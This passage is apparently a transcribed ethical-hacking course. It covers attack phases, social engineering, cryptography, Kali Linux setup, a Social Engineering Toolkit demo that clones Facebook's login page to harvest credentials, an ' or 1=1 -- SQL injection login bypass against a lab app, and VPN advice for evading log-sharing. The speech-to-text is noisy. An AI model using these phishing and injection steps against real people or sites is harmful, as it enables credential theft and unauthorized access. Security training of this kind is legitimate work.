and to verify that those flaws actually
exist and try to figure out the
complexity of those flaws and that's
where metasploit helps us do that
wireshark could be used in the
background while we are doing both the
activities using nessus or metasploit to
keep a track of what packets are being
sent and by received on the network
which will help us analyze those packets
so whenever i run an ss scanner i would
run a wireshark in the background it
will capture the data packets and i can
go through those data packets and
analyze that data packets to identify
what nessus is actually trying to do
similarly when i try to attack a machine
using exploit on metasploit i will keep
on wireshark running in the background
to capture the data packages that have
been sent and the responses that i have
received from the victim so that i can
also go through those packets and
analyze the responses and analyze the
attack whether it was successful to what
extent was it successful and
basically will also give me a validation
of proof of the activity that has
happened nmap is another automated tool
that allows me to scan for open ports
and protocols so why would i use nmap
because pro ports and protocols become
an entry point for a hacker to gain
access to devices for example when we
connect to a web server we connect
through a web browser but we
automatically connect to port 80 using
http and port 443 is using https so if
i'm connecting to a web server using
https it is safe to assume that port 443
on the web server is open to accept
those connections similarly there would
be other services that may be left open
on the web server because nobody thought
about configuring it or they
misconfigured the web server and they
left unwanted services running so nmap
will allow me to scan those ports and
services and allow me to understand what
services are being offered on that
server so then i can start analyzing
that server identify those flaws within
those services and then try to attack
them if the application that i'm
analyzing is connected to a database and
i want to do a sql injection attack or
if i if necess tells me that there is a
sql injection attack that may be
possible on that particular application
i can use an automated tool called sql
map or sql map that would allow me to
automatically craft all the queries that
are required for a sql injection attack
and help me do that attack at the same
time so here i do not have to manually
create my own queries
the sql map tool would automatically
create them for me what i would do is i
would use nessus to identify that
particular flaw if necessary that flaw i
would then go use the tool sql map
configure it to attack that particular
web server and when i fire off the tool
it will then automatically start
directing queries sql injection queries
to the database to see if those
databases are vulnerable and if yes what
data can be retrieved from those
databases so all of these tools in a
nutshell would help me hack networks
applications operating systems and host
devices and this is what the ethical
hacker does they use these kind of tool
sets they identify what attacks they
need to do they identify the right tool
for that particular attack and they
write their exploits they create those
attacks and then they start attacking
analyze the response and then give a
report to the management providing them
feedback about how the attack was
created or crafted what was the response
to that attack and whether the attack
was successful or not if successful they
would also give recommendations of what
to do to prevent these attacks from
happening in the future so when we are
doing these attacks or when we want to
launch these attacks what is the process
that we would follow so there are six
steps that we would do as an ethical
hacker if you are just a hacker you
probably wouldn't do the sixth step
which is a reporting step so the first
step that would be done is the
reconnaissance phase which is the
information gathering phase which is
very important from ethical hackers
perspective or a hacker's perspective
because if i want to attack someone or
something as a digital device i need to
know what i'm attacking i need to know
the ip address of the device the mac
address of those devices i need to know
the operating system the build or the
version of that operating systems
applications on top the versions of
those applications so i know what i'm
attacking for example if i if i want to
attack a server i assume it's a windows
based server and i use a particular tool
to attack it but it actually turns out
to be a linux based server my attacks
are going to be unsuccessful so i need
to focus my attack based on what is
there at the other end so in my
information gathering phase i want to
identify all of that information once i
have that information done i'm going to
scan those servers using tools like nmap
that we just talked about and we're
going to try to see the open ports open
services and protocols that are running
on that server that can give me possible
entry points within the network or
within the device or within the
operating system at the same time along
with the scanning with nmap i would run
a vulnerability scanner the nexus
vulnerability scanner we talked about or
acunetix for applications and then i
would try to identify vulnerabilities in
those applications operating systems or
networks once i have identified those
vulnerabilities in the scanning phase i
would then move on to the gaining phase
where i would then craft my exploits or
choose existing exploits and start
attacking the attacking the victim at
this point in time if my attack is
successful i will probably have gained
access
by either cracking passwords or
escalating privileges or exploiting a
vulnerability that i may have found
during the scanning phase once i have
gained my access i want to maintain my
access why because the vulnerability may
not be there for long maybe somebody
updated the operating system and hence
the flaw was no longer exist or existing
or somebody change the password that we
i may have cracked does i no longer have
access so what do i do to maintain my
access i install trojans or backdoor
entries to those systems using which i
can secretly in a covert manner get
access to those devices at my own will
at my own time as long as those devices
are available over the network so that's
where i maintain my access i have hacked
them now i want to maintain my access so
i install a software which would give me
a backdoor entry to that device no
matter what once i have done this i want
to clear my track so whatever activity
that i've been doing for example
installing a trojan a trojan is also a
software that would create directory
directories and files once installed on
the victim's machine so i want to hide
that if i have access data stores if i
have modified data i want to hide that
activity because if the victim comes to
know that something has happened they
would start they would start increasing
their security parameters they might
start scanning their devices they may
take them offline thus my hack would no
longer be efficient the reason i'm
clearing my tracks is that the victim
doesn't find out that they have been
hacked or they have been compromised or
even if they do find out that they've
been compromised they cannot trace the
compromise back to me so i would be
deleting references of any of the ip
addresses or mac addresses that i may
have used to attack that particular
device and this is where i will be able
to identify where those logs were
created where those traces are once i
take off those traces the victim would
not be any visor of whether they have
been compromised or who compromised
their system and if i am successful at
all of these stages or what to whatever
extent the success that i've achieved in
any of these stages i would then create
a report based on that and i would
report to the management about the
activities that we have been able to do
and whatever we have been able to
achieve out of those activities for
example we identified 10 different flaws
there were 20 different attacks that we
wanted to do what attack did we do what
was the outcome of that attack what was
the intended or the expected output of
that attack i'll create a report which
would give a detailed analysis of all
the steps that were taken along with
screenshots and evidences of what
activity was conducted what was the
output what was the expected output and
i would submit that report to the
management giving them an idea of what
vulnerabilities and flaws exist in their
environment or their devices that need
to be mitigated so that the security can
be enhanced so these are the six steps
that the ethical hacking process would
take uh just going through this the uh
recognizance is where you're going to
use hacking tools like nmap hp to obtain
information about targets there are
hundreds of tools out there depending on
what information you want then in
scanning again nmap and expose these
kind of tools to be utilized to identify
open ports protocols and services in
gaining access you're going to exploit
the vulnerability by using the
metasploit tool that we talked about in
the previous slides in the maintaining
access you're going to install back
doors you can use meta squad at the same
time you can craft your own scripts to
create a trojan and install it on the
victims machine once you have achieved
that clearing tracks is where you're
going to clear all evidences of your
activity so that you do not get caught
or the victim doesn't even realize that
they have been hacked and once you have
done all of this we are going to create
reports that are going to be submitted
to the management to help them
understand the current security
evaluation of their organization so now
let's see how we can hack using social
engineering now what is social
engineering social engineering is the
art of manipulating humans into
revealing confidential information which
they otherwise would not have revealed
so this is where your social skill and
your people skills come into the picture
if you are able to communicate
effectively to another person they would
probably give up more information that
they intended to give out let's take a
look at examples right if you see on the
screen fishing activity what is fishing
we receive a lot of frequents on a
regular basis we have always received
those emails where we have won a lottery
of a few million dollars but we have
never realized that we didn't purchase a
lottery to win a lottery in the first
place we have always had those nigerian
frauds where a prince died in some south
african country and you out of seven
billion people on the planet have been
identified where they want to transfer a
few hundred million dollars through your
account and they want to give you 50 of
that money in return as thank you so
some very basic attacks where you go
onto websites and there's a banner
flashing at you saying congratulations
you're the 1 millionth visitor to this
website click here to claim your price
all of these are social engineering
attacks phishing attacks fake websites
fake communications being sent out to
users to prey on their gullibility most
of humans always have that dream of
striking it rich winning a huge lottery
once and for all and living their life
lavishly ever after but sadly in the
real world that's not that doesn't
happen that often and if you're
receiving those mails it is very
important that you first research the
validity of those those communications
before you even want to act upon them so
why are humans susceptible to social
engineering because humans have emotions
machines do not try pleading with the
machine to give you access to a account
that you have forgotten a password to
the machine wouldn't even know what
you're doing try pleading with a human
sympathy or empathy where you could try
to create a social injury attack where
you can plead with them saying if i do
not get access to this account
immediately i might lose my job and then
that would put my family into problems
somebody would feel empathy or sympathy
towards you and help you reset that
password and give you access to that
account it's how good the attack is and
how convincing you are for the success
of this attack to happen so what is a
familiarity exploit attackers interact
with victims to gain information which
will benefit the attackers to crack
credentials as passwords if we want to
reset our passwords what do we have as a
mechanism to resetting passwords we have
some security questions that we set up
those questions are nothing but personal
information that we would know but
through a social engineering attack it
would be easily be able to
gather the information that you have set
for your security questions the security
questions can be as simple as the first
school that you attended you probably
have that listed on your linkedin
profile where per person can just go in
there and see your academic
qualifications and identify the school
that you were in right similarly it
might also be a question what was your
mother's maiden name that's a very good
attack and that's uh i mean if a person
can interact with you let's say they are
trying to take a survey and they
approach you for a feedback on a
particular product that you have been
utilizing and they ask you these
questions you wouldn't think twice
before giving those answers as long as
the request sounds legitimate to us we
are able to justify that request we do
answer those queries so it's upon us to
verify the authenticity of the request
coming in before we answer it phishing
as discussed would be fraudulent emails
which appear to be coming from a trusted
source so email spoofing comes into mind
uh fake websites and so on so forth
exploiting human curiosity curiosity
killed the cat right so there was
there's so many physical attacks where
hackers just keep pen drives lying
around in a parking lot now this is open
a generic attack whoever falls victim
will fall victim so if i just throw
around a few usbs in the parking lot
obviously with trojans implemented on
them some people who are curious or who
are looking for a couple of freebies
might take up those pen drives plug them
in their computers to see what data is
on the pen drives at the same time once
they plug in those pendrives on their
computers the virus or the trojan would
get infected and cause harm to their
machine then exploiting human greed we
just talked about the
nigerian frauds and the lotteries those
kind of attacks the fake money-making
gimmicks now basically this is where you
prey upon the person's greed kicking in
and they are clicking on those links in
order to get that money that has been
promised to them in that email so one of
the safest mechanism to keep data
private and to keep yourself secure is
using encryption now encryption can
happen through cryptography what is
cryptography cryptography is the art of
scrambling data using a particular
algorithm so that the data becomes
unreadable to the normal user the only
person with the key to unscramble that
data would be able to unscramble it and
make sense out of that data so we're
just making it unreadable or
non-readable by using a particular key
or a particular algorithm and then we're
going to send the key to the end user
the you end user using the same key
would then decrypt that data if anybody
compromises that data while it is being
sent over the network since it is
encrypted they would not be able to read
it so the encryption algorithm would be
something like this now if you see uh
the computer word once made into
unreadable format would
look like e q o r x v gt for an end user
it wouldn't make any sense but the
person who has a key to unscramble that
would be able to convert it back to
computer and then understand the meaning
of that word so this is just a
substitution cipher that is being shown
on the screen so what is the alphabet
the key is alphabet plus three so c plus
three alphabets that becomes e o becomes
q m becomes o so the key that is
utilized to scramble the data is the
character that you are at the third
character from there would be the
corresponding key so the encrypted
message is also known as a cipher the
decryption is just the other way around
where you know the key now and you can
now figure out what that e corresponding
to by going back three characters in the
alphabet most of the times a certified
ethical hacker must decrypt a message
without knowing the secret key so let's
say a ransomware has affected your
organization or has affected a device
and you want to figure out or you want
to decrypt that data now as ethical
hacker you wouldn't be for paying a
ransom to the hacker would you so it is
now your prerogative of how you're going
to work around and how you're going to
try to crack the encryption mechanism
how to crack the cipher to decrypt that
message and see what's within it right
decryption without the use of a secret
key that is known as a cryptanalysis
cryptanalysis is the reversing of an
algorithm to figure out what the
decryption was uh without using a key so
cryptanalysis can be done using various
formats the first one is a brute force
attack second is a dictionary attack the
third one is a rainbow table attack a
brute force attack is trying every
combination permutation and combination
of the key to figure out what the key
was it is 100 successful but may take a
lot of time a dictionary attack is where
you have created a list of possible
encryption mechanisms a list of possible
cracks and then you try to figure out
whether those cracks work or not rainbow
tables are where you have an encrypted
text in hand and you're trying to figure
out uh the similarities between between
the text that you have and the encrypted
data that you wanted to decrypt in the
first place so in the brute force attack
you're trying every possible combination
permutation of what the key would be in
dictionary attack you have a word list
that would tantamount to the key and if
you're you're trying to match all the
words listed in the text file or the
word list to see if any of those words
are going to work to decrypt that data
here in the rainbow table the ciphertext
is compared with another ciphertext you
find out similarities and then you try
to work or reverse engineer your way
accordingly so let's have a quick demo
on cryptography before we end this
session so to begin with the demo of
cryptography we are on our website
called spammic.com which will help us
scramble the message that we created
into a completely uh format which would
be unrelated to the topic at hand so if
i say i want to encode a message i turn
a short message into spam so what this
does is you want to send across a secret
message you type in the secret message a
short one it will convert that into a
spam mail you send it across so
whoever's reading that spam mail would
never get an idea of the embedded
message within it so if i want to type
in a message here hi this is a secret
message the password is asd at the rate
one two three four and i want to send
this out to people or to one of my
colleagues but i want to send it out in
a secret manner so that others are not
aware of this so when i press on encode
what the algorithm will do is it will
convert this message into a spam mail so
my message hi this is a secret message
the password is at the rate one two
three four or asd at the rate one two
three four gets converted into this now
if you read it dear e-commerce
professional this letter was specially
selected to be sent to you this doesn't
make sense there is nowhere or no
reference to the actual message that
i've already said so if i copy this
entire message and i send it let's say
via email to the recipient now the thing
is that the recipient needs to know that
i've encoded it using spam mimic the
algorithm needs to remain the same so
once they know that it is spam mimic
what they can do is now in this instance
what i'm going to do is i'm going to
open up a new browser and i'm going to
go to the same website and at this point
in time i'm going to click on decode
when i click on decode i'm going to
paste the message that i have just
copied there we are and this message is
now being copied into a different
browser and if i decode this you will
see that it will convert it back to the
original message that there was so the
key is there at spam mimic and it is
embedded within the message so whenever
we paste the message in the decode
factor it knows what the key was and it
can decrypt that message and give me the
actual message that was embedded within
it there we are the entire message this
is what we created in the google chrome
browser and in the firefox browser we
decoded similarly if i want to protect
these kind of messages there is an aspen
encrypt.com website where let's say we
use text encryption and i want to
encrypt the same message this
is a secret message the password is asd
at the rate one two three four and then
i give it a password to protect this
message let's say the word password and
i use the cipher to scramble this by
using let's say aes which is the
strongest cipher right now and i say
encrypt so this is what the encryption
would look like and basically if i don't
have the password over here if i decrypt
it you would see that the error has
occurred if i type in the password over
here and then decrypt it it will be able
to convert that back into the
unscrambled text and it will give me
what the original message was this is a
secret message the password is asd at
the rate one two three four so if i want
to keep my data secure from hackers i
want to scramble it in such a way that
they would not be able to crack it or it
would be very difficult for them to
crack it and this is one of the first
mechanisms that would be recommended by
any ethical hacker to keep the data
secure now let's talk about downloading
and installing kali linux along with
that we'll also be looking at the basic
commands that are required for kali
linux all right so i've opened my
browser and we want to go to the kali
website so we want to go to kali dot org
you can directly type in kali dot org
and go to the website i can just do a
google search and say kali download and
it will give you the same website but it
will directly take you to the downloads
pages so either here and or you can go
to the home page cookies are being
installed on your machine so see which
cookies you want to allow i'm only going
to use the necessary cookies to support
the site and you can see that this gives
you the latest kali linux news and
tutorials gives you the latest release
what is in that release and gives you a
lot of documentation which will help you
understand what tools have been
developed and what functionality has
been given in the latest version if you
want to download you can directly go
here and you can download kali linux now
kali linux is a 2.6 gigabyte download so
it's going to take time the latest
version being 2019.4
and we click over here i'm using a
download manager to manage all these
huge downloads and you can see it's
pointed to the operating systems folder
and it is going to be a 2.57 gb download
so you click on download and in the
background you can see this is going to
be downloaded and you're going to
minimize this and
it will take a few minutes for that to
download but this is an iso image so we
need to install it on a virtual machine
so what we need is we need to use a
hypervisor which will allow us to create
virtual machines so we can either use
vmware workstation which you can
download from here however
this is paid version so you can see it
is around 250 or something for this
software but it is a very good software
to have so if you click on download now
it is going to start the download it's a
30-day trial period if you want to use
it after 30 days you'll need to enter
the key which you'll get after
purchasing the software if you do not
want to utilize this the free version
that you have you can either download
vmware player but there are some
limitations for vmware player that you
might want to look at does you want to
compare these products before you want
to purchase them right otherwise you can
download oracle virtualbox which is a
free hypervisor it's not as robust as
vmware workstation but it does the trick
right so the the free version 6.1 is
free and you can then create your own
virtual machines over there and install
operating systems on them what i do have
i already have a vmware workstation
installed so i'm just going to open that
up and that's my vmware workstation as
you can see i already have a lot of
virtual machines created over here what
we are going to do is we are going to
configure a virtual machine for the kali
linux operating system that we are
downloading which should be somewhere
here let's see it's at 43
so
halfway there till then let's create the
virtual machine so i click click on file
create a new virtual machine i'm going
to customize the machine so click on
next this little default we don't want
to change that and then we want to
install the operating system later we
don't want to point it out right now so
i'll just click on i will install the
operating system later click on next we
want to install linux now in the drop
down you would not see kali linux over
here however you can choose ubuntu
64-bit that's what i'm going to choose
there it is next
what is the name that we want i want to
give it kali linux without the typo and
i want to store it in one of the folders
that i've created by default it stores
on the c drive which is not a good place
to store uh you don't want to run out of
space on your c drive so i'm going to
click on this pc and this is my data and
in here i'll have a folder called
virtualbox or virtual machines there it
is within which you can see the other
softwares that i already created i'm
going to create a new folder and call it
kali 2019 l l for is latest for me
because you can see already have a kali
linux so i'm just going to identify this
folder with the l at the end going to
select it and click on ok you can see
the path being changed over here click
on next it's going to ask you how many
processors now depending on the
processor that you have you can see i've
got a 8 core i7 so if i give it 16 cores
or 16 processors that's not going to
work i cannot go beyond what the
physicality already is so for this
machine one processor with one core is
more than enough if you're going to load
use a lot of tools at the same time you
might just want to give it two cores so
if you're giving it two cores it will
ask us for ram to be provided for this
virtual machine by default 2048
megabytes that's 2gb of ram is more than
enough if you require more we can change
this later on so click on next we want
to use nat for now leave this default
next whatever is recommended keep it the
way it is we do not want to change it
next create a new virtual hard disk for
this machine and it is going to ask us
the size 20 gb is more than fine store
it as a single file you don't want to
use multiple file options click on next
and then click on browse where you want
to store the vmdk file or the virtual
hard disk file and we go back again to
the same folder that we had created
virtual machines and we look at the kali
linux kali 2019 l and we want to store
the vmdk file over there once we save it
we want to click on next and then we
want to click on finish so this is the
virtual machine that has been created
right here right now this is the basic
configuration now where are we at with
the operating system and you can see the
operating system has been downloaded and
it is stored in this particular folder
so we go to e drive so we are looking
for the sub the operating system that we
have downloaded we downloaded in the
operating systems folder and if we go in
here you can see the current one the
kali linux 2019.4
iso right here so what we do we go back
to the kali linux machine that we have
created edit virtual machine settings
and we point this virtual machine using
the cd dvd and then we point the iso the
one that we downloaded over here so we
go back to e drive we go back to os and
we click on kali linux 2019 click on
open so now when this boots up it will
boot up with this iso and then it will
allow us to install the operating system
so click on ok then we click on power on
this virtual machine it will start
powering on it will boot to the iso and
it will start giving us the booting
options so i'm just going to
enter the full screen mode over here for
this to be better visible and we don't
want the live mode what we want is we
want to use the graphical install and
then we highlight that we press enter
and you can see the setup starting up
we'll wait for the gui to pop up there
it is which language do we want for now
we want english click on continue where
are we located click on continue and the
configure your keyboard we want the us
keyboard american english continue it is
going to detect the hardware so as you
can see on the screen it's attempting a
auto configuration for most of these uh
settings the network with dhcp it has
identified the network cards uh hardware
like uh the processor that has been
provided or is asking for a host name
we're going to leave it at default we're
going to click on continue domain name
i'm not joining this into a domain as
yet there's going to be a standalone
machine so i can leave this blank click
on continue now it's going to configure
the network it is asking for a password
at this point in time the root password
type in any password that you want
ensure that you remember the password
now by default the username for the
account is the name is the word root we
are just creating the password for the
root account and then we want to click
on continue setting up the clock looking
at the hard disks now here it asks us do
we want to use the entire disk the 20 gb
virtual hard disk that we had provided
or do we want to give it a manual
configuration or a guided one where we
want encryption and a logical volume
management coming into the picture we're
just going to use the first option
guided you use entire disk don't worry
it's only going to use the virtual disk
that we had created click on continue it
will give us that it's a 21.5 gb vmware
virtual disk that we had and click on
continue all files in one partition
that's what we want recommended for new
users whatever it is we don't want to
change these folders continue and this
is what we have configured once we click
on continue it is going to say you are
you sure you want to make these changes
click on yes click on continue and it
will start installing kali linux on your
device now this is going to take a few
minutes for the installation to work all
right so that's the installation that's
completed now it's asking us to
configure a package manager a network
mirror can be used to supplement the
software that is included on the
installation media this may also make
new versions of software available you
want to use a network mirror we can
click no for now and then click on
continue now this is going to install
the grub boot loader this might take a
few minutes as well install the group
grub loader to the master boot record
yes click on continue click the hard
disk that you have just utilized this is
the one click on continue it will
install the grub book loader running
through the last phases of the
installation and now it says the
installation is complete we want to
click click on continue finishing the
installation and then it will do a
reboot all right and you can see this is
starting up so we are going to use you
just wait out the boot and now it
started the booting sequence just going
to maximize the screen and you can see
it's asking me for the password this is
the one that we created now that's the
that's not the password that's the
username that's the root and the
password that we had created at that
point in time and then click on log in
and this is your screen uh now what we
need to do here is we need to install
vmware tools which will help us manage
the screen and help the virtual machine
to be a little bit better integrated on
the system so that's
not mounted yet so we're just waiting
for it to mount there it is and what we
want to do here is open vmware tools
upgrader all right so what we want is we
want to extract or we want to use this
open x archiver and once we do that
we'll see the vmware install dot pl
double click on that all right we've got
the vmware tools here what i've done is
we have extract to and have extracted
that on the desktop right so what we
just did was click on the desktop over
here open and this is what it will do
and click on extract now there is
happening because i've already extracted
this open this up we want to run this
vmware install dot pl so what do we do
we open up the terminal window which is
the command line interface over here and
now this is where some of the commands
come into the picture so for example pwd
it will show us the present working
directory ls will show us the list of
the folders that are there so the folder
that we have is on our desktop so we'll
just change directory to desktop press
enter do an ls that will show us the
list and you can see vmware tools
distribute that's the folder that we
have right here right so we want to go
into that folder see the vmware at this
point you can just click on tab and it
will populate everything over there
press enter do an ls and we want the
vmware hyphen install dot pl to be
executed all right so we tried executing
that command we had an error over there
so what we need to do is we need to
execute this command so dot slash vmware
hyphen install.pl and we'll start
creating now uh it will ask you for your
input installing vmware tools in which
directory do you want to install the
binary files uh by default it is going
to see you slash usr slash bin if i just
press
enter it is going to use the default as
you can see the input over here what
directory do you want the init
directories i'm just going to press keep
on pressing enter for the defaults to
come in this part does not exist it is
going to create it default yes defaults
everywhere and then it tries to start
initializing it to maximize the screen
and this is where it is installing and
you can see by just installing that it
automatically adjusted the screen and
now we got a full screen of kali linux
right here right and that is what vmware
tools does for us once we have installed
the operating system and now you can see
the entire screen on here you will see
the tool sets that are given here now
why are we using kali linux in the first
place because this comes in uh with a
bundle of thousands of softwares that
are ready to be utilized for ethical
hacking right and they have been
categorized over here for information
gathering vulnerability analysis web
application analysis and so on so forth
so you can see from forensics onwards
reporting tools and as you scroll down
you can see your development tools
graphics coming in internet and the
system configuration coming into the
picture these are your settings for your
operating system so these are basically
your tools we are right now the
favorites if i click on information
gathering you will see that other tools
for information gathering start
appearing over here for vulnerability
analysis we have got sparta and map
fuzzing tools web application analysis
we've got comics skip fish sql map
database assessments password attacks
and so on so forth so if we just go in
the favorites this was the terminal
emulator that we utilized is the command
line that we saw we use the cd command
we use the pwd command we did the ls
command as well to give us the list of
the directory that we are in similarly
there would be commands like cat so
let's go to cd downloads let's see what
the uh what's there you can see this
case sensitive so if i type in a capital
d and then do a tab ls there's nothing
over here on download so cd dot dot will
take us back one directory i can see we
are back from downloads to root if i
want to go to desktop this is how i go
to desktop do a ls you can see the
vmware tools uh folder over there cd
vmware tools and we go into that folder
ls which will give us the list of all
those files now you can see install is a
file that we had edited back then so if
i do a cat install you will see the cat
basically is the command that will help
us look at the contents of the file all
right without opening up the file
without editing the file so you can see
just uh if i scroll up this is where we
give the cat command it then
printed the contents of the file over
here and then it exited and gave me back
to command line right here right if i
want to copy this cp root desktop vmware
install and if you want to copy it to
root downloads and press enter now what
we are going to do is we are going to
see if this file the install file that
we just edited over here has been copied
to the downloads folder so we do us we
are currently in the vmware on the
desktop vmware tools district folder
video cd dot dot that takes us down one
directory so we are still in the desktop
do a cd dot dot now you can see we are
back in the root and now we are going to
do a cd downloads
ls and you can see the copied file right
here so if i do a cat install you can
see the same content of that file coming
in so these are some of the commands
that we would need to learn as we go
ahead the remove command is
let's say we've got install we do a man
rm man is the manual page command that
gives us the
pages with the description of how that
particular command is to be utilized so
rm is remove files or directories
synopsis is the description the options
hyphen f4 hyphen i for prompt hyphen
capitalize prompt once before removing
more than three files and so on so forth
if you want to exit this you can press q
to exit and you come back to this page
so if i say rm install
ls you will see that the install file
has now been deleted so in windows we
use the del del command in linux it is
the rm command so this is what we wanted
to look at the demo for kali linux how
to download it how to install it and
some of the basic commands that we can
utilize let's look at the practical at
this point in time for fishing all right
let's begin with the fishing uh tutorial
we have the kali linux operating system
booted up over here what we are going to
do is we are going to open up a tool
called set social engineering toolkit
which you would find in this option and
that's the tool that we want it's a
command line tool a menu driven tool we
are going to host a fake facebook page
and we can see how we can harvest
credentials by this kind of an attack so
these are some disclaimers you might
want to go through that do you want to
agree to the terms of service yes
press enter and that's your social
engineering toolkit and we are talking
about a phishing attack which can comes
under the social engineering attack so
it like i said it's a menu driven tool
so we just have to look at these options
and then just type in the number of the
option that we want so we want to do a
social engineering attack so i type in
one press enter and that it is asking me
whether i want a spear phishing attack a
website attack vector we are going to
choose a second option so i type in two
press enter and then it asks me
what i want to do i want to take the
third option here credential harvester
attack methodology and we want to do the
third attack now it is asking whether we
want to use the in-house website
templates that it already has or do we
want to clone a site or do we have a
customized site that we have prepared
that we want to migrate into this tool
you're going to do the site cloning
option so we're going to type in two
press enter and then it is going to ask
me the ip address where it wants to
capture and store the credentials by
default this is the ip address that i'm
using so if i leave it blank it will
take my default ip address so i'm just
going to press enter and now it is
asking me the url to clone so i type in
https w dot
facebook.com what it is going to do it
is going to connect online and it is now
just it has cloned the website uh
facebook login.php the best way to use
this attack is that you if you use the
if the username and password form are in
the same field or the same page
regardless this captures all posts on a
website so you may need to copy www.star
into html depending on where your
directory structure is press return if
you understand what we are saying here
so press enter the social engineering
toolkit credential harvest attack is
running on port 80 information will be
displayed to you as it arrives so the
site was
71.134 right the default ip address and
this is where the website is being
hosted let's check that out so let me
open up a browser on my host machine and
let me point it to the kali linux
machine that we have just created
192.168.71.1
and you should see a login to facebook
coming up right here looks genuine it is
genuine because we just went online and
downloaded this let's just have a recap
let's have an explanation of what we are
trying to do i am trying to host fake
facebook page on my server which has an
embedded script in it which is going to
do credential harvesting so the attack
here is let's say if i'm now hosted this
i can craft a fake email send it across
to a victim saying uh your facebook
account has seen some unforeseen
activity create a hyperlink using html
coding within that click here to access
your account and verify uh that the
account is secured and when they click
on that link they will be redirected to
my fake page which is here you can see
the uh ipr this is my virtual machine's
ip address but i'm seeing a facebook
login page and i'm going to type in
someone at
somewhere.com and the password i'm just
going to type in the regular ones that i
use and if you see it when we typed in
uh the username and password the page
just refreshed and gave us the login
page again but now if you look at the
url i'm actually on facebook's login
page which is exactly the same that i
was hosting so a layman wouldn't
probably figure out they've been hacked
by now they just would figure out okay
they probably typed in the incorrect
password and the page refresh or
something like that and they're just
going to log in and they're actually
going to access the facebook page thus
they might not even realize that
something went wrong but if i go back to
my virtual machine you can see that it
has captured some data and it is
reporting over here of what has happened
so if i just scroll up let's see what
happened here and if we have been able
to capture anything so we gotta hit
printing the output this does the http
1.1 200 okay response coming in password
field phone
and we just looking there it is email
someone at somewhere.com and
password that i typed in asd at the rate
one two three four so it has captured
the username and the password right here
uh once you're done i mean this is the
way attackers work now this is a very
basic attack again uh in the actual
trainings you would then look at how you
would host this on a real website make
it a global attack right now it's a
virtual machine with a class cip address
so here the thought process is where can
we get a free hosting where we can host
this kind of sites maybe i'll have to
purchase a domain which looks like
similar to facebook or the victim that
i'm trying to attack so this is just a
poc so we just wanted to find out if we
can uh how phishing is done and this is
exactly how it is done right so pressing
ctrl c would exit this tool and takes
you back to the actual menu press
99.99 to exit and
there it is close the two window and
that's
the fishing practical after fishing
let's talk about sql injection sql
injection stands for uh structured query
language interaction which is a database
attack though it resides within the
application so it's the application
vulnerability that we are trying to look
at to try to bypass authentication as
the name suggests a sequel injection
vulnerability allows an attacker to
inject malicious input into a sql
statement what is a sql statement a
query that is used by an application and
is fired off to the database database
executes that query
gets that information that is required
and sends it back to the user if the
user is authenticated so we're going to
look at the sql injection attack demo
here and
what we are going to do is we are going
to go back to our vmware workstation and
i've got a tool over here called ovasp
broken web application which is a
utility that has been created for people
like us to test our skills to learn on
how we can develop our skills further so
this has a lot of vulnerable
applications built within it we're just
going to try to access it and we are
going to see if we can create a sql
injection attack just waiting for it to
boot up once it boots up it will give us
an ip address there we are so we need to
connect to 71.132
so i can just use the same browser i was
using close up facebook and now go to
192.168.71.132
and this is the ovap broken web
application project uh what we're going
to do is we're going to go to utility
and this is a application that has a lot
of information within it you can see it
gives you links about what you should do
help me video tutorials listing of
vulnerabilities that they have and so on
so forth so you can see we are not
logged in right now i'm just going to do
this as a demo so what we're going to do
is we're going to look at this and
bypass authentication so we are taken to
the login page where you need a username
and password to log in i'm going to type
in test as the username and test as the
password click on login and you can see
that account does not exist so the
authentication mechanism works now what
we want to do is we want to create a
query now what does a query look like
when i type in a username and a password
if i just type in a single quote here it
is going to create an error and this is
what a sql query looks like select
username from accounts where username is
a single quote and then the exception
error happened so it did it's not
showing the rest of the query to us now
what i'm going to do is i'm just going
to craft a query here uh single quote
and give it a condition or one equals
one space hyphen hyphen space what
happens hyphen hyphen space is comments
out anything after that so the password
field is being commented out at this
point in time and i'm just giving it a
condition where the condition is true
one does equal one and if this condition
is true it is going to allow me to log
in so you can see right now we are not
logged in this bypasses the
authentication mechanism and you can see
user authenticated and we are now logged
in as admin so in the training what we
need to understand uh as a whole is how
sql works what are the queries that are
structured with how you can what are the
testing operators now the single quote
that we used that was an operator in the
sql syntax what these operators are how
they function and then how you can
leverage these attacks there are
different tools that are given to you in
kali as well that you can utilize so in
kali linux you can just open up a
command prompt and there's a tool called
sql map you need to give it a particular
site so sql map hyphen u for the url and
whatever the url is now url here and
then once you're here you just press the
enter key this tool will craft all the
queries in the background for you you
don't even have to no sql query or sql
languages uh this is a very easy tool to
utilize sadly i cannot demo this on a
live website because that would be
illegal but you can see how you can
operate this yourself that's what sql
injections are all about moving on we
now talk about uh vpn's virtual private
networks and a virtual private network
is basically a secure network that
allows me to anonymize myself over the
internet so what i'm doing is i'm
connecting from here to a server that
encrypts my channel encrypts my
connection and does allows me to keep my
data secure now the basic essence of a
vpn or a virtual private network is to
allow me this encryption mechanism where
i can encrypt and safeguard my data the
added advantage that nowadays a vpn
gives is that they can allow us to spoof
our ip address or obfuscate our ip
address so we can actually become
anonymous on the internet it can allow
us to use multiple ip addresses and thus
secure ourselves on the internet for
example i use vpn called cyber ghost and
what this allows me to do is it allows
me so many servers over here and if you
look at the entire list all the servers
then there are no spy servers uh which
and guarantee me that they are not going
to keep and store any logs and thus they
are not going to record any of the
activity that i'm doing right since they
are located out of romania this becomes
a little bit more safer for me because
the government and the laws over there
are a little bit more relaxed than other
countries uh they give me uh different
links for torrenting for streaming for
connection feature so there are a lot of
vpns out there so for example let's go
to the website
cyberghost.com so we can see there's a
sale going on 76 percent sale or you can
go on to express vpn which is also very
good vp and then there is not vpn it
depends on what you want and how you
want to utilize it so just purchasing a
vpn or getting a free free vpn is not
enough it depends on which country the
vpn originates from and which server
you're connected to for example most of
the countries have a pact where they
share information amongst themselves
even if you're connected to a vpn that
means that these companies that provide
these services have to generate and
store logs and these logs have to be
reported to the government if they ask
for it now if there's a list of 14
countries that actually uh focuses on
this practice so you have to find out
vpn that and a server that is not a part
of those 14 countries and ensure that
those logs are not going to be reported
to the government and these are three
vpns basically are something that which
are good and i personally use cyberghost
i have used the others i just keep on
rotating them just to get an idea of
which one is better so
these are vpns that can allow you to
anonymize yourself on the internet
moving on these are the ones that we
talked about there are other safer vpn
hide my ass expressvpn and so on so
forth from our terminologies let's now
talk about vps
vps is basically virtual private server
where you can rent a service or server
as a service a virtual machine as a
service so basically on a cloud using
infrastructure as a service you can rent
a server and utilize it for whatever
activity you want so let's go to uh
these sites register.com good id network
solutions or we can talk about other
cloud solutions as well so here you can
get uh register your domain names uh so
in the previous exercise for let's say
when we talked about the phishing
